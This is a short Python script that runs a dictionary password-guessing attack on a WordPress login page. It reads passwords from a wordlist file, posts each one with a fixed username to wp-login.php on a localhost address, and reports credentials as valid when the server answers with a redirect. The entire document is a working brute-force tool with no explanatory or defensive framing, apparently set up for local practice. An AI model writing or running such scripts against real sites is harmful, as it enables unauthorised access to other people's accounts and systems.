import requests
 
dictionary = open("dictionary_wordpress.txt","r")
 
for word in dictionary.readlines():
    data = {
        'log':'user@domain.com',
        'pwd':word.strip("\n")  
    }
 
    response = requests.post("http://localhost:8000/wp-login.php", data=data, allow_redirects=False)

    if response.status_code in [301,302]:
        print("Credentials are valid:", data)
        break
    else:
        print("Credentials are wrong", data)
